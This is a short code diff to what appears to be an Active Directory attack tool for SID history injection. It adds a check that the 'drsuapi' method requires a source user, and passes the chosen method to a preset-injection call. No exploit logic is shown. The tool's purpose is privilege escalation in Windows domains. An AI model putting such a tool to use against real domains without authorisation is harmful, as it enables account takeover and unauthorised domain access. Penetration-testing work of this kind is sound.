@@ -213,6 +213,13 @@ def validate_arguments(args, auth_method: str, parser) -> bool:
         if args.remove and not args.sid:
             parser.error("--remove requires --sid")
 
+    # DRSUAPI method requires --source-user (DRSAddSidHistory needs SrcPrincipal/SrcDomain)
+    if hasattr(args, 'method') and args.method == 'drsuapi' and args.target:
+        if not args.source_user:
+            parser.error("--method drsuapi requires --source-user (and optionally --source-domain).\n"
+                        "  DRSAddSidHistory copies a source principal's SID, it cannot inject arbitrary SIDs.\n"
+                        "  Use --method ldap for --sid/--preset injection, or specify --source-user.")
+
     # Bulk validation
     if args.targets_file:
         if not (args.sid or args.preset or args.bulk_clear):
@@ -342,7 +349,7 @@ def handle_target(attacker: SIDHistoryAttack, formatter: OutputFormatter,
         return True
 
     if args.preset:
-        success = attacker.add_sid_preset(target, args.preset)
+        success = attacker.add_sid_preset(target, args.preset, method=args.method)
     elif args.source_user:
         success = attacker.inject_sid_history(
             target, args.source_user,
